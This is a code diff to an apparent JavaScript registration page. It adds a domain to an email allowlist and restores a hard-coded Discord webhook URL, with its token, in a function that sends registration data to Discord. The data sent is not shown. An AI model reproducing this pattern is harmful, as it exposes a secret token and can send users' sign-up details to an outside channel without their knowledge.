@@ -174,7 +174,7 @@
         }
 
         function validateEmailDomain(email) {
-            const allowedDomains = ['gmail.com', 'yahoo.com', 'starmail.com', 'hotmail.com', 'live.com', 'aol.com', 'outlook.com', 'proton.me', 'protonmail.com', 'fastmail.com', 'starmail.com'];
+            const allowedDomains = ['gmail.com', 'icloud.com', 'yahoo.com', 'starmail.com', 'hotmail.com', 'live.com', 'aol.com', 'outlook.com', 'proton.me', 'protonmail.com', 'fastmail.com', 'starmail.com'];
             const domain = email.split('@')[1];
             return allowedDomains.includes(domain);
         }
@@ -192,7 +192,7 @@
         }
 
         async function sendRegistrationDataToDiscord(data) {
-            const webhookUrl = 'webhook feature has since been removed. there is no webhook here anymore';
+            const webhookUrl = 'https://discord.com/api/webhooks/1286834098769498183/5-ayohgREXm2T6NbgXnJ3p-rJxzjTOiYu6DL0SRuO_zLjgTxdM4bcZW8tD7XjIQYvN4k';
             const embed = {
                 title: "New Registration",
                 color: 5814783,
